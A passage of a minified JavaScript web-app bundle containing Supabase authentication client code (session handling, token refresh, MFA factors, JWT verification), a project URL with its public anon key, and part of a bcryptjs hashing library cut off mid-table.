Os(this.userStorage,this.storageKey+"-user");!this.storage.isServer&&Object.is(this.storage,this.userStorage)&&!d&&(d={user:o.user},await En(this.userStorage,this.storageKey+"-user",d)),o.user=(n=d?.user)!==null&&n!==void 0?n:Pc()}else if(o&&!o.user&&!o.user){const d=await Os(this.storage,this.storageKey+"-user");d&&d?.user?(o.user=d.user,await as(this.storage,this.storageKey+"-user"),await En(this.storage,this.storageKey,o)):o.user=Pc()}if(this._debug(i,"session from storage",o),!this._isValidSession(o)){this._debug(i,"session is not valid"),o!==null&&await this._removeSession();return}const c=((s=o.expires_at)!==null&&s!==void 0?s:1/0)*1e3-Date.now()<Ec;if(this._debug(i,`session has${c?"":" not"} expired with margin of ${Ec}s`),c){if(this.autoRefreshToken&&o.refresh_token){const{error:d}=await this._callRefreshToken(o.refresh_token);d&&(console.error(d),Cc(d)||(this._debug(i,"refresh failed with a non-retryable error, removing the session",d),await this._removeSession()))}}else if(o.user&&o.user.__isUserNotAvailableProxy===!0)try{const{data:d,error:m}=await this._getUser(o.access_token);!m&&d?.user?(o.user=d.user,await this._saveSession(o),await this._notifyAllSubscribers("SIGNED_IN",o)):this._debug(i,"could not get user data, skipping SIGNED_IN notification")}catch(d){console.error("Error getting user data:",d),this._debug(i,"error getting user data, skipping SIGNED_IN notification",d)}else await this._notifyAllSubscribers("SIGNED_IN",o)}catch(o){this._debug(i,"error",o),console.error(o);return}finally{this._debug(i,"end")}}async _callRefreshToken(n){var s,i;if(!n)throw new cs;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const o=`#_callRefreshToken(${n.substring(0,5)}...)`;this._debug(o,"begin");try{this.refreshingDeferred=new So;const{data:c,error:d}=await this._refreshAccessToken(n);if(d)throw d;if(!c.session)throw new cs;await this._saveSession(c.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",c.session);const m={session:c.session,error:null};return this.refreshingDeferred.resolve(m),m}catch(c){if(this._debug(o,"error",c),Fe(c)){const d={session:null,error:c};return Cc(c)||await this._removeSession(),(s=this.refreshingDeferred)===null||s===void 0||s.resolve(d),d}throw(i=this.refreshingDeferred)===null||i===void 0||i.reject(c),c}finally{this.refreshingDeferred=null,this._debug(o,"end")}}async _notifyAllSubscribers(n,s,i=!0){const o=`#_notifyAllSubscribers(${n})`;this._debug(o,"begin",s,`broadcast = ${i}`);try{this.broadcastChannel&&i&&this.broadcastChannel.postMessage({event:n,session:s});const c=[],d=Array.from(this.stateChangeEmitters.values()).map(async m=>{try{await m.callback(n,s)}catch(f){c.push(f)}});if(await Promise.all(d),c.length>0){for(let m=0;m<c.length;m+=1)console.error(c[m]);throw c[0]}}finally{this._debug(o,"end")}}async _saveSession(n){this._debug("#_saveSession()",n),this.suppressGetSessionWarning=!0;const s=Object.assign({},n),i=s.user&&s.user.__isUserNotAvailableProxy===!0;if(this.userStorage){!i&&s.user&&await En(this.userStorage,this.storageKey+"-user",{user:s.user});const o=Object.assign({},s);delete o.user;const c=um(o);await En(this.storage,this.storageKey,c)}else{const o=um(s);await En(this.storage,this.storageKey,o)}}async _removeSession(){this._debug("#_removeSession()"),await as(this.storage,this.storageKey),await as(this.storage,this.storageKey+"-code-verifier"),await as(this.storage,this.storageKey+"-user"),this.userStorage&&await as(this.userStorage,this.storageKey+"-user"),await this._notifyAllSubscribers("SIGNED_OUT",null)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const n=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{n&&ar()&&window?.removeEventListener&&window.removeEventListener("visibilitychange",n)}catch(s){console.error("removing visibilitychange callback failed",s)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const n=setInterval(()=>this._autoRefreshTokenTick(),An);this.autoRefreshTicker=n,n&&typeof n=="object"&&typeof n.unref=="function"?n.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(n),setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const n=this.autoRefreshTicker;this.autoRefreshTicker=null,n&&clearInterval(n)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const n=Date.now();try{return await this._useSession(async s=>{const{data:{session:i}}=s;if(!i||!i.refresh_token||!i.expires_at){this._debug("#_autoRefreshTokenTick()","no session");return}const o=Math.floor((i.expires_at*1e3-n)/An);this._debug("#_autoRefreshTokenTick()",`access token expires in ${o} ticks, a tick lasts ${An}ms, refresh threshold is ${Jc} ticks`),o<=Jc&&await this._callRefreshToken(i.refresh_token)})}catch(s){console.error("Auto refresh tick failed with error. This is likely a transient error.",s)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(n){if(n.isAcquireTimeout||n instanceof f0)this._debug("auto refresh token tick lock not available");else throw n}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!ar()||!window?.addEventListener)return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>await this._onVisibilityChanged(!1),window?.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(n){console.error("_handleVisibilityChange",n)}}async _onVisibilityChanged(n){const s=`#_onVisibilityChanged(${n})`;this._debug(s,"visibilityState",document.visibilityState),document.visibilityState==="visible"?(this.autoRefreshToken&&this._startAutoRefresh(),n||(await this.initializePromise,await this._acquireLock(-1,async()=>{if(document.visibilityState!=="visible"){this._debug(s,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting");return}await this._recoverAndRefresh()}))):document.visibilityState==="hidden"&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(n,s,i){const o=[`provider=${encodeURIComponent(s)}`];if(i?.redirectTo&&o.push(`redirect_to=${encodeURIComponent(i.redirectTo)}`),i?.scopes&&o.push(`scopes=${encodeURIComponent(i.scopes)}`),this.flowType==="pkce"){const[c,d]=await wn(this.storage,this.storageKey),m=new URLSearchParams({code_challenge:`${encodeURIComponent(c)}`,code_challenge_method:`${encodeURIComponent(d)}`});o.push(m.toString())}if(i?.queryParams){const c=new URLSearchParams(i.queryParams);o.push(c.toString())}return i?.skipBrowserRedirect&&o.push(`skip_http_redirect=${i.skipBrowserRedirect}`),`${n}?${o.join("&")}`}async _unenroll(n){try{return await this._useSession(async s=>{var i;const{data:o,error:c}=s;return c?{data:null,error:c}:await Ee(this.fetch,"DELETE",`${this.url}/factors/${n.factorId}`,{headers:this.headers,jwt:(i=o?.session)===null||i===void 0?void 0:i.access_token})})}catch(s){if(Fe(s))return{data:null,error:s};throw s}}async _enroll(n){try{return await this._useSession(async s=>{var i,o;const{data:c,error:d}=s;if(d)return{data:null,error:d};const m=Object.assign({friendly_name:n.friendlyName,factor_type:n.factorType},n.factorType==="phone"?{phone:n.phone}:{issuer:n.issuer}),{data:f,error:x}=await Ee(this.fetch,"POST",`${this.url}/factors`,{body:m,headers:this.headers,jwt:(i=c?.session)===null||i===void 0?void 0:i.access_token});return x?{data:null,error:x}:(n.factorType==="totp"&&(!((o=f?.totp)===null||o===void 0)&&o.qr_code)&&(f.totp.qr_code=`data:image/svg+xml;utf-8,${f.totp.qr_code}`),{data:f,error:null})})}catch(s){if(Fe(s))return{data:null,error:s};throw s}}async _verify(n){return this._acquireLock(-1,async()=>{try{return await this._useSession(async s=>{var i;const{data:o,error:c}=s;if(c)return{data:null,error:c};const{data:d,error:m}=await Ee(this.fetch,"POST",`${this.url}/factors/${n.factorId}/verify`,{body:{code:n.code,challenge_id:n.challengeId},headers:this.headers,jwt:(i=o?.session)===null||i===void 0?void 0:i.access_token});return m?{data:null,error:m}:(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+d.expires_in},d)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",d),{data:d,error:m})})}catch(s){if(Fe(s))return{data:null,error:s};throw s}})}async _challenge(n){return this._acquireLock(-1,async()=>{try{return await this._useSession(async s=>{var i;const{data:o,error:c}=s;return c?{data:null,error:c}:await Ee(this.fetch,"POST",`${this.url}/factors/${n.factorId}/challenge`,{body:{channel:n.channel},headers:this.headers,jwt:(i=o?.session)===null||i===void 0?void 0:i.access_token})})}catch(s){if(Fe(s))return{data:null,error:s};throw s}})}async _challengeAndVerify(n){const{data:s,error:i}=await this._challenge({factorId:n.factorId});return i?{data:null,error:i}:await this._verify({factorId:n.factorId,challengeId:s.id,code:n.code})}async _listFactors(){const{data:{user:n},error:s}=await this.getUser();if(s)return{data:null,error:s};const i=n?.factors||[],o=i.filter(d=>d.factor_type==="totp"&&d.status==="verified"),c=i.filter(d=>d.factor_type==="phone"&&d.status==="verified");return{data:{all:i,totp:o,phone:c},error:null}}async _getAuthenticatorAssuranceLevel(){return this._acquireLock(-1,async()=>await this._useSession(async n=>{var s,i;const{data:{session:o},error:c}=n;if(c)return{data:null,error:c};if(!o)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const{payload:d}=Tc(o.access_token);let m=null;d.aal&&(m=d.aal);let f=m;((i=(s=o.user.factors)===null||s===void 0?void 0:s.filter(b=>b.status==="verified"))!==null&&i!==void 0?i:[]).length>0&&(f="aal2");const p=d.amr||[];return{data:{currentLevel:m,nextLevel:f,currentAuthenticationMethods:p},error:null}}))}async fetchJwk(n,s={keys:[]}){let i=s.keys.find(m=>m.kid===n);if(i)return i;const o=Date.now();if(i=this.jwks.keys.find(m=>m.kid===n),i&&this.jwks_cached_at+Sb>o)return i;const{data:c,error:d}=await Ee(this.fetch,"GET",`${this.url}/.well-known/jwks.json`,{headers:this.headers});if(d)throw d;return!c.keys||c.keys.length===0||(this.jwks=c,this.jwks_cached_at=o,i=c.keys.find(m=>m.kid===n),!i)?null:i}async getClaims(n,s={}){try{let i=n;if(!i){const{data:j,error:N}=await this.getSession();if(N||!j.session)return{data:null,error:N};i=j.session.access_token}const{header:o,payload:c,signature:d,raw:{header:m,payload:f}}=Tc(i);s?.allowExpired||Jb(c.exp);const x=!o.alg||o.alg.startsWith("HS")||!o.kid||!("crypto"in globalThis&&"subtle"in globalThis.crypto)?null:await this.fetchJwk(o.kid,s?.keys?{keys:s.keys}:s?.jwks);if(!x){const{error:j}=await this.getUser(i);if(j)throw j;return{data:{claims:c,header:o,signature:d},error:null}}const p=Xb(o.alg),b=await crypto.subtle.importKey("jwk",x,p,!0,["verify"]);if(!await crypto.subtle.verify(p,b,d,Db(`${m}.${f}`)))throw new ed("Invalid JWT signature");return{data:{claims:c,header:o,signature:d},error:null}}catch(i){if(Fe(i))return{data:null,error:i};throw i}}}Da.nextInstanceID=0;const mv=Da;class pv extends mv{constructor(n){super(n)}}var xv=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};class gv{constructor(n,s,i){var o,c,d;if(this.supabaseUrl=n,this.supabaseKey=s,!n)throw new Error("supabaseUrl is required.");if(!s)throw new Error("supabaseKey is required.");const m=wb(n),f=new URL(m);this.realtimeUrl=new URL("realtime/v1",f),this.realtimeUrl.protocol=this.realtimeUrl.protocol.replace("http","ws"),this.authUrl=new URL("auth/v1",f),this.storageUrl=new URL("storage/v1",f),this.functionsUrl=new URL("functions/v1",f);const x=`sb-${f.hostname.split(".")[0]}-auth-token`,p={db:fb,realtime:pb,auth:Object.assign(Object.assign({},mb),{storageKey:x}),global:hb},b=jb(i??{},p);this.storageKey=(o=b.auth.storageKey)!==null&&o!==void 0?o:"",this.headers=(c=b.global.headers)!==null&&c!==void 0?c:{},b.accessToken?(this.accessToken=b.accessToken,this.auth=new Proxy({},{get:(w,j)=>{throw new Error(`@supabase/supabase-js: Supabase Client is configured with the accessToken option, accessing supabase.auth.${String(j)} is not possible`)}})):this.auth=this._initSupabaseAuthClient((d=b.auth)!==null&&d!==void 0?d:{},this.headers,b.global.fetch),this.fetch=vb(s,this._getAccessToken.bind(this),b.global.fetch),this.realtime=this._initRealtimeClient(Object.assign({headers:this.headers,accessToken:this._getAccessToken.bind(this)},b.realtime)),this.rest=new Lg(new URL("rest/v1",f).href,{headers:this.headers,schema:b.db.schema,fetch:this.fetch}),b.accessToken||this._listenForAuthEvents()}get functions(){return new Ng(this.functionsUrl.href,{headers:this.headers,customFetch:this.fetch})}get storage(){return new cb(this.storageUrl.href,this.headers,this.fetch)}from(n){return this.rest.from(n)}schema(n){return this.rest.schema(n)}rpc(n,s={},i={}){return this.rest.rpc(n,s,i)}channel(n,s={config:{}}){return this.realtime.channel(n,s)}getChannels(){return this.realtime.getChannels()}removeChannel(n){return this.realtime.removeChannel(n)}removeAllChannels(){return this.realtime.removeAllChannels()}_getAccessToken(){var n,s;return xv(this,void 0,void 0,function*(){if(this.accessToken)return yield this.accessToken();const{data:i}=yield this.auth.getSession();return(s=(n=i.session)===null||n===void 0?void 0:n.access_token)!==null&&s!==void 0?s:null})}_initSupabaseAuthClient({autoRefreshToken:n,persistSession:s,detectSessionInUrl:i,storage:o,storageKey:c,flowType:d,lock:m,debug:f},x,p){const b={Authorization:`Bearer ${this.supabaseKey}`,apikey:`${this.supabaseKey}`};return new pv({url:this.authUrl.href,headers:Object.assign(Object.assign({},b),x),storageKey:c,autoRefreshToken:n,persistSession:s,detectSessionInUrl:i,storage:o,flowType:d,lock:m,debug:f,fetch:p,hasCustomAuthorizationHeader:"Authorization"in this.headers})}_initRealtimeClient(n){return new Yg(this.realtimeUrl.href,Object.assign(Object.assign({},n),{params:Object.assign({apikey:this.supabaseKey},n?.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((s,i)=>{this._handleTokenChanged(s,"CLIENT",i?.access_token)})}_handleTokenChanged(n,s,i){(n==="TOKEN_REFRESHED"||n==="SIGNED_IN")&&this.changedAccessToken!==i?this.changedAccessToken=i:n==="SIGNED_OUT"&&(this.realtime.setAuth(),s=="STORAGE"&&this.auth.signOut(),this.changedAccessToken=void 0)}}const bv=(a,n,s)=>new gv(a,n,s),vv="https://mmxgpolwfxxqfskeggfb.supabase.co",yv="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1teGdwb2x3Znh4cWZza2VnZ2ZiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI5MjAyOTEsImV4cCI6MjA2ODQ5NjI5MX0.43vWJtNOBBGWAhInUouSMOCwlckVBhMqTxaR5Tpm9Bg";function wv(a){const n=a.trim().replace(/^"|"$/g,"").replace(/^'|'$/g,"");return/^https?:\/\//i.test(n)?n:/^[a-z0-9]{20}$/i.test(n)?`https://${n}.supabase.co`:n}const td=wv(vv),m0=yv?.trim().replace(/^"|"$/g,"").replace(/^'|'$/g,"");function jv(){if(!td||!m0)throw new Error("Supabase is not configured. Set VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY in .env");if(!/^https:\/\//i.test(td))throw new Error("Invalid VITE_SUPABASE_URL. It must start with https://")}jv();const Z=bv(td,m0);async function xm(){try{const{error:a}=await Z.from("users").select("id").limit(1);if(a)throw new Error(`Supabase connectivity ok but query failed: ${a.message}`)}catch(a){const n="Check .env values, network connectivity, and that the project URL is reachable from your browser.",s=a instanceof Error?a.message:String(a);throw new Error(`Unable to reach Supabase: ${s}. ${n}`)}}const Nv={};var rd=null;function kv(a){try{return crypto.getRandomValues(new Uint8Array(a))}catch{}try{return Nv.randomBytes(a)}catch{}if(!rd)throw Error("Neither WebCryptoAPI nor a crypto module is available. Use bcrypt.setRandomFallback to set an alternative");return rd(a)}function Fv(a){rd=a}function Nd(a,n){if(a=a||kd,typeof a!="number")throw Error("Illegal arguments: "+typeof a+", "+typeof n);a<4?a=4:a>31&&(a=31);var s=[];return s.push("$2b$"),a<10&&s.push("0"),s.push(a.toString()),s.push("$"),s.push(jo(kv(Ma),Ma)),s.join("")}function p0(a,n,s){if(typeof n=="function"&&(s=n,n=void 0),typeof a=="function"&&(s=a,a=void 0),typeof a>"u")a=kd;else if(typeof a!="number")throw Error("illegal arguments: "+typeof a);function i(o){lr(function(){try{o(null,Nd(a))}catch(c){o(c)}})}if(s){if(typeof s!="function")throw Error("Illegal callback: "+typeof s);i(s)}else return new Promise(function(o,c){i(function(d,m){if(d){c(d);return}o(m)})})}function x0(a,n){if(typeof n>"u"&&(n=kd),typeof n=="number"&&(n=Nd(n)),typeof a!="string"||typeof n!="string")throw Error("Illegal arguments: "+typeof a+", "+typeof n);return sd(a,n)}function g0(a,n,s,i){function o(c){typeof a=="string"&&typeof n=="number"?p0(n,function(d,m){sd(a,m,c,i)}):typeof a=="string"&&typeof n=="string"?sd(a,n,c,i):lr(c.bind(this,Error("Illegal arguments: "+typeof a+", "+typeof n)))}if(s){if(typeof s!="function")throw Error("Illegal callback: "+typeof s);o(s)}else return new Promise(function(c,d){o(function(m,f){if(m){d(m);return}c(f)})})}function b0(a,n){for(var s=a.length^n.length,i=0;i<a.length;++i)s|=a.charCodeAt(i)^n.charCodeAt(i);return s===0}function _v(a,n){if(typeof a!="string"||typeof n!="string")throw Error("Illegal arguments: "+typeof a+", "+typeof n);return n.length!==60?!1:b0(x0(a,n.substring(0,n.length-31)),n)}function Sv(a,n,s,i){function o(c){if(typeof a!="string"||typeof n!="string"){lr(c.bind(this,Error("Illegal arguments: "+typeof a+", "+typeof n)));return}if(n.length!==60){lr(c.bind(this,null,!1));return}g0(a,n.substring(0,29),function(d,m){d?c(d):c(null,b0(m,n))},i)}if(s){if(typeof s!="function")throw Error("Illegal callback: "+typeof s);o(s)}else return new Promise(function(c,d){o(function(m,f){if(m){d(m);return}c(f)})})}function Av(a){if(typeof a!="string")throw Error("Illegal arguments: "+typeof a);return parseInt(a.split("$")[2],10)}function Ev(a){if(typeof a!="string")throw Error("Illegal arguments: "+typeof a);if(a.length!==60)throw Error("Illegal hash length: "+a.length+" != 60");return a.substring(0,29)}function Cv(a){if(typeof a!="string")throw Error("Illegal arguments: "+typeof a);return v0(a)>72}var lr=typeof process<"u"&&process&&typeof process.nextTick=="function"?typeof setImmediate=="function"?setImmediate:process.nextTick:setTimeout;function v0(a){for(var n=0,s=0,i=0;i<a.length;++i)s=a.charCodeAt(i),s<128?n+=1:s<2048?n+=2:(s&64512)===55296&&(a.charCodeAt(i+1)&64512)===56320?(++i,n+=4):n+=3;return n}function Tv(a){for(var n=0,s,i,o=new Array(v0(a)),c=0,d=a.length;c<d;++c)s=a.charCodeAt(c),s<128?o[n++]=s:s<2048?(o[n++]=s>>6|192,o[n++]=s&63|128):(s&64512)===55296&&((i=a.charCodeAt(c+1))&64512)===56320?(s=65536+((s&1023)<<10)+(i&1023),++c,o[n++]=s>>18|240,o[n++]=s>>12&63|128,o[n++]=s>>6&63|128,o[n++]=s&63|128):(o[n++]=s>>12|224,o[n++]=s>>6&63|128,o[n++]=s&63|128);return o}var Fn="./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),is=[-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,1,54,55,56,57,58,59,60,61,62,63,-1,-1,-1,-1,-1,-1,-1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,-1,-1,-1,-1,-1,-1,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,-1,-1,-1,-1,-1];function jo(a,n){var s=0,i=[],o,c;if(n<=0||n>a.length)throw Error("Illegal len: "+n);for(;s<n;){if(o=a[s++]&255,i.push(Fn[o>>2&63]),o=(o&3)<<4,s>=n){i.push(Fn[o&63]);break}if(c=a[s++]&255,o|=c>>4&15,i.push(Fn[o&63]),o=(c&15)<<2,s>=n){i.push(Fn[o&63]);break}c=a[s++]&255,o|=c>>6&3,i.push(Fn[o&63]),i.push(Fn[c&63])}return i.join("")}function y0(a,n){var s=0,i=a.length,o=0,c=[],d,m,f,x,p,b;if(n<=0)throw Error("Illegal len: "+n);for(;s<i-1&&o<n&&(b=a.charCodeAt(s++),d=b<is.length?is[b]:-1,b=a.charCodeAt(s++),m=b<is.length?is[b]:-1,!(d==-1||m==-1||(p=d<<2>>>0,p|=(m&48)>>4,c.push(String.fromCharCode(p)),++o>=n||s>=i)||(b=a.charCodeAt(s++),f=b<is.length?is[b]:-1,f==-1)||(p=(m&15)<<4>>>0,p|=(f&60)>>2,c.push(String.fromCharCode(p)),++o>=n||s>=i)));)b=a.charCodeAt(s++),x=b<is.length?is[b]:-1,p=(f&3)<<6>>>0,p|=x,c.push(String.fromCharCode(p)),++o;var w=[];for(s=0;s<o;s++)w.push(c[s].charCodeAt(0));return w}var Ma=16,kd=10,Pv=16,Rv=100,gm=[608135816,2242054355,320440878,57701188,2752067618,698298832,137296536,3964562569,1160258022,953160567,3193202383,887688300,3232508343,3380367581,1065670069,3041331479,2450970073,2306472731],bm=[3509652390,2564797868,805139163,3491422135,3101798381,1780907670,3128725573,4046225305,614570311,3012652279,134345442,2240740374,1667834072,1901547113,2757295779,4103290238,227898511,1921955416,1904987480,2182433518,2069144605,3260701109,2620446009,720527379,3318853667,677414384,3393288472,3101374703,2390351024,1614419982,1822297739,2954791486,3608508353,3174124327,2024746970,1432378464,3864339955,2857741204,1464375394,1676153920,1439316330,715854006,3033291828,289532110,2706671279,2087905683,3018724369,1668267050,732546397,1947742710,3462151702,2609353502,2950085171,1814351708,2050118529,680887927,999245976,1800124847,3300911131,1713906067,1641548236,4213287313,1216130144,1575780402,4018429277,3917837745,3693486850,3949271944,596196993,3549867205,258830323,2213823033,772490370,2760122372,1774776394,2652871518,566650946,4142492826,1728879713,2882767088,1783734482,3629395816,2517608232,2874225571,1861159788,326777828,3124490320,2130389656,2716951837,967770486,1724537150,2185432712,2364442137,1164943284,2105845187,998989502,3765401048,2244026483,1075463327,1455516326,1322494562,910128902,469688178,1117454909,936433444,3490320968,3675253459,1240580251,122909385,2157517691,634681816,4142456567,3825094682,3061402683,2540495037,79693498,3249098678,1084186820,1583128258,426386531,1761308591,1047286709,322548459,995290223,1845252383,2603652396,3431023940,2942221577,3202600964,3727903485,1712269319,422464435,3234572375,1170764815,3523960633,3117677531,1434042557,442511882,3600875718,1076654713,1738483198,4213154764,2393238008,3677496056,1014306527,4251020053,793779912,2902807211,842905082,4246964064,1395751752,1040244610,2656851899,3396308128,445077038,3742853595,3577915638,679411651,2892444358,2354009459,1767581616,3150600392,3791627101,3102740896,284835224,4246832056,1258075500,768725851,2589189241,3069724005,3532540348,1274779536,3789419226,2764799539,1660621633,3471099624,4011903706,913787905,3497959166,737222580,2514213453,2928710040,3937242737,1804850592,3499020752,2949064160,2386320175,2390070455,2415321851,4061277028,2290661394,2416832540,1336762016,1754252060,3520065937,3014181293,791618072,3188594551,3933548030,2332172193,3852520463,3043980520,413987798,3465142937,3030929376,4245938359,2093235073,3534596313,375366246,2157278981,2479649556,555357303,3870105701,2008414854,3344188149,4221384143,3956125452,2067696032,3594591187,2921233993,2428461,544322398,577241275,1471733935,610547355,4027169054,1432588573,1507829418,2025931657,3646575487,545086370,48609733,2200306550,1653985193,298326376,1316178497,3007786442,2064951626,458293330,2589141269,3591329599,3164325604,727753846,2179363840,146436021,1461446943,4069977195,705550613,3059967265,3887724982,4281599278,3313849956,1404054877,2845806497,146425753,1854211946,1266315497,3048417604,3681880366,3289982499,290971e4,1235738493,2632868024,2414719590,3970600049,1771706367,1449415276,3266420449,422970021,1963543593,2690192192,3826793022,1062508698,1531092325,1804592342,2583117782,2714934279,4024971509,1294809318,4028980673,1289560198,2221992742,1669523910,35572830,157838143,1052438473,1016535060,1802137761,1753167236,1386275462,3080475397,2857371447,1040679964,2145300060,2390574316,1461121720,2956646967,4031777805,4028374788,33600511,2920084762,1018524850,629373528,3691585981,3515945977,2091462646,2486323059,586499841,988145025,935516892,3367335476,2599673255,2839830854,265290510,3972581182,2759138881,3795373465,1005194799,847297441,406762289,1314163512,1332590856,1866599683,4127851711,750260880,613907577,1450815602,3165620655,3734664991,3650291728,3012275730,3704569646,1427272223,778793252,1343938022,2676280711,2052605720,1946737175,3164576444,3914038668,3967478842,3682934266,1661551462,3294938066,4011595847,840292616,3712170807,616741398,312560963,711312465,1351876610,322626781,1910503582,271666773,2175563734,1594956187,70604529,3617834859,1007753275,1495573769,4069517037,2549218298,2663038764,504708206,2263041392,3941167025,2249088522,1514023603,1998579484,1312622330,694541497,2582060303,2151582166,1382467621,776784248,2618340202,3323268794,2497899128,2784771155,503983604,4076293799,907881277,423175695,432175456,1378068232,4145222326,3954048622,3938656102,3820766613,2793130115,2977904593,26017576,3274890735,3194772133,1700274565,1756076034,4006520079,3677328699,720338349,1533947780,354530856,688349552,3973924725,1637815568,332179504,3949051286,53804574,2852348879,3044236432,1282449977,3583942155,3416972820,4006381244,1617046695,2628476075,3002303598,1686838959,431878346,2686675385,1700445008,1080580658,1009431731,832498133,3223435511,2605976345,2271191193,2516031870,1648197032,4164389018,2548247927,300782431,375919233,238389289,3353747414,2531188641,2019080857,1475708069,455242339,2609103871,448939670,3451063019,1395535956,2413381860,1841049896,1491858159,885456874,4264095073,4001119347,1565136089,3898914787,1108368660,540939232,1173283510,2745871338,3681308437,4207628240,3343053890,4016749493,1699691293,1103962373,3625875870,2256883143,3830138730,1031889488,3479347698,1535977030,4236805024,3251091107,2132092099,1774941330,1199868427,1452454533,157007616,2904115357,342012276,595725824,1480756522,206960106,497939518,591360097,863170706,2375253569,3596610801,1814182875,2094937945,3421402208,1082520231,3463918190,2785509508,435703966,3908032597,1641649973,2842273706,3305899714,1510255612,2148256476,2655287854,3276092548,4258621189,236887753,3681803219,274041037,1734335097,3815195456,3317970021,1899903192,1026095262,4050517792,356393447,2410691914,3873677099,3682840055,3913112168,2491498743,4132185628,2489919796,1091903735,1979897079,3170134830,3567386728,3557303409,857797738,1136121015,1342202287,507115054,2535736646,337727348,3213592640,1301675037,2528481711,1895095763,1721773893,3216771564,62756741,2142006736,835421444,2531993523,1442658625,3659876326,2882144922,676362277,1392781812,170690266,3921047035,1759253602,3611846912,1745797284,664899054,1329594018,3901205900,3045908486,2062866102,2865634940,3543621612,3464012697,1080764994,553557557,3656615353,3996768171,991055499,499776247,1265440854,648242737,3940784050,980351604,3713745714,1749149687,3396870395,4211799374,3640570775,1161844396,3125318951,1431517754,545492359,4268468663,3499529547,1437099964,2702547544,3433638243,2581715763,2787789398,1060185593,1593081372,2418618748,4260947970,69676912,2159744348,86519011,2512459080,3838209314,1220612927,3339683548,133810670,1090789135,1078426020,1569222167,845107691,3583754449,4072456591,1091646820,628848692,1613405280,3757631651,526609435,236106946,48312990,2942717905,3402727701,1797494240,859738849,992217954,4005476642,2243076622,3870952857,3732016268,765654824,3490871365,2511836413,1685915746,3888969200,1414112111,2273134842,3281911079,4080962846,172450625,2569994100,980381355,4109958455,2819808352,2716589560,2568741196,3681446669,3329971472,1835478071,660984891,3704678404,4045999559,3422617507,3040415634,1762651403,1719377915,3470491036,2693910283,3642056355,3138596744,1364962596,2073328063,1983633131,926494387,3423689081,2150032023,4096667949,1749200295,3328846651,309677260,2016342300,1779581495,3079819751,111262694,1274766160,443224088,298511866,1025883608,3806446537,1145181785,168956806,3641502830,3584813610,1689216846,3666258015,3200248200,1692713982,2646376535,4042768518,1618508792,1610833997,3523052358,4130873264,2001055236,3610705100,2202168115,4028541809,2961195399,1006657119,2006996926,3186142756,1430667929,3210227297,1314452623,4074634658,4101304120,2273951170,1399257539,3367210612,3027628629,1190975929,2062231137,2333990788,2221543033,2438960610,1181637006,548689776,2362791313,3372408396,3104550113,3145860560,296247880,1970579870,3078560182,3769228297,1714227617,3291629107,3898220290,166772364,1251581989,493813264,448347421,195405023,2709975567,677966185,3703036547,1463355134,2715995803,1338867538,1343315457,2802222074,2684532164,233230375,2599980071,2000651841,3277868038,1638401717,4028070440,3237316320,6314154,819756386,300326615,590932579,1405279636,3267499572,3150704214,2428286686,3959192993,3461946742,1862657033,1266418056,963775037,2089974820,2263052895,1917689273,448879540,3550394620,3981727096,150775221,3627908307,1303187396,508620638,2975983352,2726630617,1817252668,1876281319,1457606340,908771278,3720792119,3617206836,2455994898,1729034894,1080033504,976866871,3556439503,2881648439,1522871579,1555064734,1336096578,3548522304,2579274686,3574697629,3205460757,3593280638,3338716283,3079412587,564236357,2993598910,1781952180,1464380207,3163844217,3332601554,1699332808,1393555694,1183702653,3581086237,1288719814,691649499,2847557200,2895455976,3193889540,2717570544,1781354906,1676643554,2592534050,3230253752,1126444790,2770207658,2633158820,2210423226,2615765581,2414155088,3127139286,673620729,2805611233,1269405062,4015350505,3341807571,4149409754,1057255273,2012875353,2162469141,2276492801,2601117357,993977747,3918593370,2654263191,753973209,36408145,2530585658,25011837,3520020182,2088578344,530523599,2918365339,1524020338,1518925132,3760827505,3759777254,1202760957,3985898139,3906192525,674977740,4174734889,2031300136,2019492241,3983892565,4153806404,3822280332,352677332,2297720250,60907813,90501309,3286998549,1016092578,2535922412,2839152426,457141659,509813237,4120667899,652014361,1966332200,2975202805,55981186,2327461051,676427537,3255491064,2882294119,3433927263,1307055953,